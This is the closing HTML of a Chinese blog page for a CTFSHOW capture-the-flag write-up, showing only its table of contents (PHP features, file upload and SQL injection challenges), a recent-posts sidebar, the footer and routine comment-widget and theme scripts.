class="toc-link" href="#web-117"><span class="toc-number">4.12.</span> <span class="toc-text">web-117</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E7%89%B9%E6%80%A7"><span class="toc-number">5.</span> <span class="toc-text">PHP特性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-89"><span class="toc-number">5.1.</span> <span class="toc-text">web-89</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-90"><span class="toc-number">5.2.</span> <span class="toc-text">web-90</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-91"><span class="toc-number">5.3.</span> <span class="toc-text">web-91</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-92"><span class="toc-number">5.4.</span> <span class="toc-text">web-92</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-93"><span class="toc-number">5.5.</span> <span class="toc-text">web-93</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-94"><span class="toc-number">5.6.</span> <span class="toc-text">web-94</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-95"><span class="toc-number">5.7.</span> <span class="toc-text">web-95</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-96"><span class="toc-number">5.8.</span> <span class="toc-text">web-96</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-97"><span class="toc-number">5.9.</span> <span class="toc-text">web-97</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-98"><span class="toc-number">5.10.</span> <span class="toc-text">web-98</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-99"><span class="toc-number">5.11.</span> <span class="toc-text">web-99</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-100"><span class="toc-number">5.12.</span> <span class="toc-text">web-100</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-101"><span class="toc-number">5.13.</span> <span class="toc-text">web-101</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-102"><span class="toc-number">5.14.</span> <span class="toc-text">web-102</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-104"><span class="toc-number">5.15.</span> <span class="toc-text">web-104</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-105"><span class="toc-number">5.16.</span> <span class="toc-text">web-105</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-106"><span class="toc-number">5.17.</span> <span class="toc-text">web-106</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-107"><span class="toc-number">5.18.</span> <span class="toc-text">web-107</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-108"><span class="toc-number">5.19.</span> <span class="toc-text">web-108</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-109"><span class="toc-number">5.20.</span> <span class="toc-text">web-109</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-110"><span class="toc-number">5.21.</span> <span class="toc-text">web-110</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-111"><span class="toc-number">5.22.</span> <span class="toc-text">web-111</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-112"><span class="toc-number">5.23.</span> <span class="toc-text">web-112</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-113"><span class="toc-number">5.24.</span> <span class="toc-text">web-113</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-114"><span class="toc-number">5.25.</span> <span class="toc-text">web-114</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-115"><span class="toc-number">5.26.</span> <span class="toc-text">web-115</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-123"><span class="toc-number">5.27.</span> <span class="toc-text">web-123</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-125"><span class="toc-number">5.28.</span> <span class="toc-text">web-125</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-126"><span class="toc-number">5.29.</span> <span class="toc-text">web-126</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-127"><span class="toc-number">5.30.</span> <span class="toc-text">web-127</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-128"><span class="toc-number">5.31.</span> <span class="toc-text">web-128</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-129"><span class="toc-number">5.32.</span> <span class="toc-text">web-129</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-130"><span class="toc-number">5.33.</span> <span class="toc-text">web-130</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-131"><span class="toc-number">5.34.</span> <span class="toc-text">web-131</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-132"><span class="toc-number">5.35.</span> <span class="toc-text">web-132</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-133"><span class="toc-number">5.36.</span> <span class="toc-text">web-133</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-134"><span class="toc-number">5.37.</span> <span class="toc-text">web-134</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-135"><span class="toc-number">5.38.</span> <span class="toc-text">web-135</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-136"><span class="toc-number">5.39.</span> <span class="toc-text">web-136</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-137"><span class="toc-number">5.40.</span> <span class="toc-text">web-137</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-138"><span class="toc-number">5.41.</span> <span class="toc-text">web-138</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-139"><span class="toc-number">5.42.</span> <span class="toc-text">web-139</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-140"><span class="toc-number">5.43.</span> <span class="toc-text">web-140</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-141"><span class="toc-number">5.44.</span> <span class="toc-text">web-141</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-142"><span class="toc-number">5.45.</span> <span class="toc-text">web-142</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-143"><span class="toc-number">5.46.</span> <span class="toc-text">web-143</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-144"><span class="toc-number">5.47.</span> <span class="toc-text">web-144</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-145"><span class="toc-number">5.48.</span> <span class="toc-text">web-145</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-146"><span class="toc-number">5.49.</span> <span class="toc-text">web-146</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-147"><span class="toc-number">5.50.</span> <span class="toc-text">web-147</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-148"><span class="toc-number">5.51.</span> <span class="toc-text">web-148</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-149"><span class="toc-number">5.52.</span> <span class="toc-text">web-149</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-150"><span class="toc-number">5.53.</span> <span class="toc-text">web-150</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-150-plus"><span class="toc-number">5.54.</span> <span class="toc-text">web-150_plus</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">6.</span> <span class="toc-text">文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-151"><span class="toc-number">6.1.</span> <span class="toc-text">web-151</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-153"><span class="toc-number">6.2.</span> <span class="toc-text">web-153</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-154"><span class="toc-number">6.3.</span> <span class="toc-text">web-154</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-156"><span class="toc-number">6.4.</span> <span class="toc-text">web-156</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-157"><span class="toc-number">6.5.</span> <span class="toc-text">web-157</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-159"><span class="toc-number">6.6.</span> <span class="toc-text">web-159</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-160"><span class="toc-number">6.7.</span> <span class="toc-text">web-160</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-161"><span class="toc-number">6.8.</span> <span class="toc-text">web-161</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-162"><span class="toc-number">6.9.</span> <span class="toc-text">web-162</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-163"><span class="toc-number">6.10.</span> <span class="toc-text">web-163</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-164"><span class="toc-number">6.11.</span> <span class="toc-text">web-164</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-165"><span class="toc-number">6.12.</span> <span class="toc-text">web-165</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-166"><span class="toc-number">6.13.</span> <span class="toc-text">web-166</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-167"><span class="toc-number">6.14.</span> <span class="toc-text">web-167</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-168"><span class="toc-number">6.15.</span> <span class="toc-text">web-168</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-169"><span class="toc-number">6.16.</span> <span class="toc-text">web-169</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">6.17.</span> <span class="toc-text">补充</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">7.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web-174"><span class="toc-number">7.1.</span> <span class="toc-text">web-174</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-175"><span class="toc-number">7.2.</span> <span class="toc-text">web-175</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-180"><span class="toc-number">7.3.</span> <span class="toc-text">web-180</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-183"><span class="toc-number">7.4.</span> <span class="toc-text">web-183</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-184"><span class="toc-number">7.5.</span> <span class="toc-text">web-184</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-185"><span class="toc-number">7.6.</span> <span class="toc-text">web-185</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-186"><span class="toc-number">7.7.</span> <span class="toc-text">web-186</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-187"><span class="toc-number">7.8.</span> <span class="toc-text">web-187</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-188"><span class="toc-number">7.9.</span> <span class="toc-text">web-188</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-189"><span class="toc-number">7.10.</span> <span class="toc-text">web-189</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-190"><span class="toc-number">7.11.</span> <span class="toc-text">web-190</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-191"><span class="toc-number">7.12.</span> <span class="toc-text">web-191</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-192"><span class="toc-number">7.13.</span> <span class="toc-text">web-192</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-193"><span class="toc-number">7.14.</span> <span class="toc-text">web-193</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-195"><span class="toc-number">7.15.</span> <span class="toc-text">web-195</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-196"><span class="toc-number">7.16.</span> <span class="toc-text">web-196</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-197"><span class="toc-number">7.17.</span> <span class="toc-text">web-197</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E3%80%82%E3%80%82%E3%80%82"><span class="toc-number">7.18.</span> <span class="toc-text">。。。</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/11/11/SQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93%20/" title="SQL注入"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/5b7adf6e714ea6c53e24ed50477cbab.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="SQL注入"/></a><div class="content"><a class="title" href="/2022/11/11/SQL%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93%20/" title="SQL注入">SQL注入</a><time datetime="2022-11-11T08:20:21.000Z" title="发表于 2022-11-11 16:20:21">2022-11-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/02/%E6%B5%85%E6%9E%90NodeJS/" title="浅析NodeJS"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/2193933.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="浅析NodeJS"/></a><div class="content"><a class="title" href="/2022/11/02/%E6%B5%85%E6%9E%90NodeJS/" title="浅析NodeJS">浅析NodeJS</a><time datetime="2022-11-02T11:35:18.000Z" title="发表于 2022-11-02 19:35:18">2022-11-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/31/2022%E5%B9%B410%E6%9C%88%E6%80%BB%E7%BB%93/" title="2022年10月总结"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/445.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="2022年10月总结"/></a><div class="content"><a class="title" href="/2022/10/31/2022%E5%B9%B410%E6%9C%88%E6%80%BB%E7%BB%93/" title="2022年10月总结">2022年10月总结</a><time datetime="2022-10-31T15:42:30.000Z" title="发表于 2022-10-31 23:42:30">2022-10-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/31/CTFSHOW_WP(254-378)/" title="　CTFSHOW_WP(254-378)"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/30510.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="　CTFSHOW_WP(254-378)"/></a><div class="content"><a class="title" href="/2022/10/31/CTFSHOW_WP(254-378)/" title="　CTFSHOW_WP(254-378)">　CTFSHOW_WP(254-378)</a><time datetime="2022-10-31T15:12:24.000Z" title="发表于 2022-10-31 23:12:24">2022-10-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/10/31/CTFSHOW_WP(1-197)/" title="　CTFSHOW_WP(1-197)"><img src="/img/loading.gif" data-original="https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/230437.jpg" onerror="this.onerror=null;this.src='https://yake-daigua-1313475382.cos.ap-beijing.myqcloud.com/img/mypic3(1).jpg'" alt="　CTFSHOW_WP(1-197)"/></a><div class="content"><a class="title" href="/2022/10/31/CTFSHOW_WP(1-197)/" title="　CTFSHOW_WP(1-197)">　CTFSHOW_WP(1-197)</a><time datetime="2022-10-31T15:07:24.000Z" title="发表于 2022-10-31 23:07:24">2022-10-31</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 By yake-daigua</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">愿你有一天能和你重要的人早日相遇</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'TieUOuIwaBZb4edJcJ1C02ka-gzGzoHsz',
      appKey: 'eJRGo87LLpxMlIWKemPvjBtH',
      avatar: 'monsterid',
      serverURLs: 'https://tieuouiw.lc-cn-n1-shared.com',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !true) {
  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script>function loadDisqus () {
  var disqus_config = function () {
    this.page.url = 'https://yake-daigua.top/2022/10/31/CTFSHOW_WP(1-197)/'
    this.page.identifier = '/2022/10/31/CTFSHOW_WP(1-197)/'
    this.page.title = '　CTFSHOW_WP(1-197)'
  };

  window.disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }

  document.getElementById('darkmode').addEventListener('click', () => {
    setTimeout(() => window.disqusReset(), 200)
  })
}

if ('Valine' === 'Disqus' || !true) {
  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script></div><script src="https://cdn.jsdelivr.net/gh/lete114/CDN/js/upjiang.js"></script><script type="text/javascript" src="/js/fairyDustCursor.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div>
        <style>
            [bg-lazy] {
                background-image: none !important;
                background-color: #eee !important;
            }
        </style>
        <script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 1,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(e){e.imageLazyLoadSetting.processImages=t;var n=e.imageLazyLoadSetting.isSPA,i=e.imageLazyLoadSetting.preloadRatio||1,r=o();function o(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){n&&(r=o());for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(e.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];e=function(){r=r.filter(function(t){return o!==t})},(t=o).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,t.removeAttribute("data-original"),e&&e()},t.src!==i&&(n.src=i))}()}function a(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",a),e.addEventListener("resize",a),e.addEventListener("orientationchange",a)}(this);</script></body></html>